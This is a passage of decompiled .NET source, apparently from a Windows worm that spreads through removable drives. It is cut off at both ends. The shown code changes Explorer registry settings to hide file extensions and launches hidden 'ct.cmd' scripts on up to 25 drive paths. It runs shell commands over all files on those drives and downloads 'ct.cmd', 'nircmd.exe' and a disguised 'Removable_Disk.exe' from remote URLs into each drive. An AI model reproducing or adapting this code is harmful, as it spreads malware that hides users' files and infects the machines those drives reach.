				txt_a23.set_Text(lb_22.get_Text());
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_24.set_SelectedIndex(23);
				txt_a24.set_Text(lb_23.get_Text());
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_25.set_SelectedIndex(24);
				txt_a25.set_Text(lb_25.get_Text());
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
		}
		if (pb_add.get_Value() == 20)
		{
			pb_add.set_Value(0);
			Timer_0.set_Enabled(false);
			Timer_1.set_Enabled(true);
			Timer_0.set_Enabled(true);
			try
			{
				lb_01.get_Items().Clear();
				lb_02.get_Items().Clear();
				lb_03.get_Items().Clear();
				lb_04.get_Items().Clear();
				lb_05.get_Items().Clear();
				lb_06.get_Items().Clear();
				lb_07.get_Items().Clear();
				lb_08.get_Items().Clear();
				lb_09.get_Items().Clear();
				lb_10.get_Items().Clear();
				lb_11.get_Items().Clear();
				lb_12.get_Items().Clear();
				lb_13.get_Items().Clear();
				lb_14.get_Items().Clear();
				lb_15.get_Items().Clear();
				lb_16.get_Items().Clear();
				lb_17.get_Items().Clear();
				lb_18.get_Items().Clear();
				lb_19.get_Items().Clear();
				lb_20.get_Items().Clear();
				lb_21.get_Items().Clear();
				lb_22.get_Items().Clear();
				lb_23.get_Items().Clear();
				lb_24.get_Items().Clear();
				lb_25.get_Items().Clear();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer_1_Tick(object sender, EventArgs e)
	{
		pb_exper1.Increment(1);
		if (pb_add.get_Value() == 5)
		{
			try
			{
				RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey.SetValue("Hidden", 2);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey2.SetValue("HideFileExt", 1);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (pb_exper1.get_Value() == 10)
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo(txt_a1.get_Text() + "ct.cmd");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo(txt_a2.get_Text() + "ct.cmd");
				processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo2);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo3 = new ProcessStartInfo(txt_a3.get_Text() + "ct.cmd");
				processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo3);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo4 = new ProcessStartInfo(txt_a4.get_Text() + "ct.cmd");
				processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo4);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo5 = new ProcessStartInfo(txt_a5.get_Text() + "ct.cmd");
				processStartInfo5.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo5);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo6 = new ProcessStartInfo(txt_a6.get_Text() + "ct.cmd");
				processStartInfo6.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo6);
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo7 = new ProcessStartInfo(txt_a7.get_Text() + "ct.cmd");
				processStartInfo7.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo7);
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo8 = new ProcessStartInfo(txt_a8.get_Text() + "ct.cmd");
				processStartInfo8.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo8);
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo9 = new ProcessStartInfo(txt_a9.get_Text() + "ct.cmd");
				processStartInfo9.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo9);
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo10 = new ProcessStartInfo(txt_a10.get_Text() + "ct.cmd");
				processStartInfo10.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo10);
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo11 = new ProcessStartInfo(txt_a11.get_Text() + "ct.cmd");
				processStartInfo11.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo11);
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo12 = new ProcessStartInfo(txt_a12.get_Text() + "ct.cmd");
				processStartInfo12.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo12);
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo13 = new ProcessStartInfo(txt_a13.get_Text() + "ct.cmd");
				processStartInfo13.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo13);
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo14 = new ProcessStartInfo(txt_a14.get_Text() + "ct.cmd");
				processStartInfo14.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo14);
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo15 = new ProcessStartInfo(txt_a15.get_Text() + "ct.cmd");
				processStartInfo15.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo15);
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo16 = new ProcessStartInfo(txt_a16.get_Text() + "ct.cmd");
				processStartInfo16.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo16);
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo17 = new ProcessStartInfo(txt_a17.get_Text() + "ct.cmd");
				processStartInfo17.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo17);
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo18 = new ProcessStartInfo(txt_a18.get_Text() + "ct.cmd");
				processStartInfo18.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo18);
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo19 = new ProcessStartInfo(txt_a19.get_Text() + "ct.cmd");
				processStartInfo19.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo19);
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo20 = new ProcessStartInfo(txt_a20.get_Text() + "ct.cmd");
				processStartInfo20.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo20);
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo21 = new ProcessStartInfo(txt_a21.get_Text() + "ct.cmd");
				processStartInfo21.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo21);
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo22 = new ProcessStartInfo(txt_a22.get_Text() + "ct.cmd");
				processStartInfo22.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo22);
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo23 = new ProcessStartInfo(txt_a23.get_Text() + "ct.cmd");
				processStartInfo23.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo23);
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo24 = new ProcessStartInfo(txt_a24.get_Text() + "ct.cmd");
				processStartInfo24.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo24);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo25 = new ProcessStartInfo(txt_a25.get_Text() + "ct.cmd");
				processStartInfo25.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo25);
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a1.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a1.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a1.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a2.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a2.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a2.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a3.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a3.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a3.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a4.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a4.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a4.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a5.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a5.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a5.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a6.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a6.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a6.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a7.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a7.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a7.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a8.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a8.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a8.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a9.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a9.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a9.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a10.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a10.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a10.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a11.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a11.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a11.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a12.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a12.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a12.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a13.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a13.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a13.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a14.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a14.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a14.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a15.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a15.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a15.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a16.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a16.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a16.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a17.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a17.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a17.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a18.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a18.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a18.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError45)
			{
				ProjectData.SetProjectError(projectError45);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a19.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a19.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a19.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError46)
			{
				ProjectData.SetProjectError(projectError46);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a20.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a20.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a20.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError47)
			{
				ProjectData.SetProjectError(projectError47);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a21.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a21.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a21.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError48)
			{
				ProjectData.SetProjectError(projectError48);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a22.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a22.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a22.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError49)
			{
				ProjectData.SetProjectError(projectError49);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a23.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a23.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a23.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError50)
			{
				ProjectData.SetProjectError(projectError50);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a24.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a24.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a24.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError51)
			{
				ProjectData.SetProjectError(projectError51);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string_5 + txt_a25.get_Text() + "*" + string_3, (AppWinStyle)0, Interaction.Shell(string_4 + txt_a25.get_Text() + "*.*", (AppWinStyle)0, Interaction.Shell(string_5 + txt_a25.get_Text() + "*" + string_3, (AppWinStyle)0, false, -1) != 0, -1) != 0, -1);
			}
			catch (Exception projectError52)
			{
				ProjectData.SetProjectError(projectError52);
				ProjectData.ClearProjectError();
			}
		}
		if (pb_exper1.get_Value() == 90)
		{
			if (!File.Exists(txt_a1.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a1.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError53)
				{
					ProjectData.SetProjectError(projectError53);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a1.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a1.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError54)
				{
					ProjectData.SetProjectError(projectError54);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a1.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a1.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError55)
				{
					ProjectData.SetProjectError(projectError55);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a2.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a2.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError56)
				{
					ProjectData.SetProjectError(projectError56);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a2.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a2.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError57)
				{
					ProjectData.SetProjectError(projectError57);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a2.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a2.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError58)
				{
					ProjectData.SetProjectError(projectError58);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a3.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a3.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError59)
				{
					ProjectData.SetProjectError(projectError59);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a3.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a3.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError60)
				{
					ProjectData.SetProjectError(projectError60);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a3.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a3.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError61)
				{
					ProjectData.SetProjectError(projectError61);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a4.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a4.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError62)
				{
					ProjectData.SetProjectError(projectError62);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a4.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a4.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError63)
				{
					ProjectData.SetProjectError(projectError63);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a4.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a4.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError64)
				{
					ProjectData.SetProjectError(projectError64);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a5.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a5.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError65)
				{
					ProjectData.SetProjectError(projectError65);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a5.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a5.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError66)
				{
					ProjectData.SetProjectError(projectError66);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a5.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a5.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError67)
				{
					ProjectData.SetProjectError(projectError67);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a6.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a6.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError68)
				{
					ProjectData.SetProjectError(projectError68);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a6.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a6.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError69)
				{
					ProjectData.SetProjectError(projectError69);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a6.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a6.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError70)
				{
					ProjectData.SetProjectError(projectError70);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a7.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a7.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError71)
				{
					ProjectData.SetProjectError(projectError71);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a7.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a7.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError72)
				{
					ProjectData.SetProjectError(projectError72);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a7.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a7.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError73)
				{
					ProjectData.SetProjectError(projectError73);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a8.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a8.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError74)
				{
					ProjectData.SetProjectError(projectError74);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a8.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a8.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError75)
				{
					ProjectData.SetProjectError(projectError75);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a8.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a8.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError76)
				{
					ProjectData.SetProjectError(projectError76);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a9.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a9.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError77)
				{
					ProjectData.SetProjectError(projectError77);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a9.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a9.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError78)
				{
					ProjectData.SetProjectError(projectError78);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a9.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a9.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError79)
				{
					ProjectData.SetProjectError(projectError79);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a10.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a10.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError80)
				{
